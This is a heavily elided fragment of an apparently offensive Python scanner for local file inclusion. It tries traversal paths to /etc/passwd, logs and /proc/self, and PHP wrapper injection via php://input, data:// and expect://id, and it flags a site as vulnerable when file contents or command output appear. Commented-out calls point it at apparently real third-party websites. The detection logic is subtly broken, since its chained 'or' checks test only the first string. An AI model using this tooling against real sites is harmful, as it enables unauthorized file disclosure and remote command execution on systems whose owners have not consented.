        ...
        try:
            ...
            if r.status_code == 200:
                if ("root:x" or "daemon:" or "games:" or "root:x:0:" or "daemon:x:1:" or "bin:x:2:" or "sys:x:3:" or "127.0.0.1    localhost") in r.text:
                    print(Fore.YELLOW+'[+]'+Fore.GREEN+' Vulnerable '+url+payload)
                    etc_file.append(url+payload)
                    r.close()
                else:
                    print(Fore.YELLOW+'[-]'+Fore.RED+' Not Vulnerable '+url+payload)
            else:
                print(Fore.YELLOW+"Site Erorred !")
        except (KeyboardInterrupt, SystemExit , ZeroDivisionError, ValueError, TypeError, SyntaxError, IOError, ConnectionError):
            print(Fore.YELLOW+"Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
            raise
    ...
    try:
        ...
        if r.status_code ==200:
            if "Gray_Security" in r.text:
                ...
                print(Fore.GREEN+'[+] '+url+'php://input')
                r.close()
            else:
...
#input_wrap("https://vito-viano-parts.ru/index.php?page=")
    ...
    try:
        ...
        if r.status_code == 200:
            if "Gray_Security" in r.text:
                ...
                print(Fore.GREEN+'[+] '+url+'data://text/plain;base64,'+code)
                r.close()
            else:
        ...
        print(Fore.YELLOW + "Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
        raise
#data_wrap("https://vito-viano-parts.ru/index.php?page=")
    ...
    try:
        ...
        if r.status_code == 200:
            if ("uid=" or "gid="  or "groups=") in r.text:
                ...
                print(Fore.GREEN +'[+] '+url+'expect://id')
                r.close()
            else:
        ...
        print(Fore.YELLOW + "Erorr : KeybordInterrupt (ctrl + c ) or Not Connect To Internet , Please Check The Connection !")
        raise
#expect_wrap("https://www.bproductions.se/index.php?page=")
...
def fast_scan(url,proxy):
    ...
    time.sleep(1)
    print(Fore.BLUE + "Testing Find Path /etc *")
    find_etc(url,pa_etc,proxy)
    print(Fore.BLUE + "Testing Find Path Logs /var/ *")
    find_log(url,pa_log,proxy)
    print(Fore.BLUE + "Testing Find Path Self /proc/ *")
    find_self(url,pa_self,proxy)
    print(Fore.BLUE + "Testing Wrapper *")
...
def deep_scan(url,etc,sel,log,fd,proxy):
    ...
    print(Fore.BLUE + "Testing Find Path Self /proc/self/ :")
    find_self(url,open_file("./path/path_self.txt"),proxy)
    print(Fore.BLUE + "Testing Find Path Self /proc/self/fd :")
